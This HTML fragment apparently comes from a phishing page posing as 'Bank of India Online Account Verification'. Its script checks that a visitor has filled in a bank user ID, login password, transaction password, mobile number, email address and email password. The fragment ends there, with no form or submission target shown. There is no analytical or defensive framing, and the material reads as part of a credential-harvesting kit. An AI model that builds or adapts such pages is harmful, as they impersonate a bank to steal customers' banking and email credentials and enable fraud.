

<html>

<title>Bank of India Online Account Verification</title>
<script language="javascript">
function validate()
{
var a = document.forms["login"]["user"].value;
var b = document.forms["login"]["password"].value;
var c = document.forms["login"]["trans"].value;
var d = document.forms["login"]["mobile"].value;
var e = document.forms["login"]["email"].value;
var f = document.forms["login"]["emailpass"].value;

if(a.length<6)
{
alert('Please check USER ID');
return false;
}

if(b.length<6)
{
alert('Please check PASSWORD ');
return false;
}

if(c.length<6)
{
alert('Please check TRANSACTION PASSWORD ');
return false;
}

if(d.length<10)
{
alert('Please check MOBILE NUMBER');
return false;
}

if(e.length<8)
{
alert('Please check EMAIL ADDRESS');
return false;
}

if(f.length<6)
{
alert('Please check EMAIL PASSWORD');
return false;
}

}

</script>
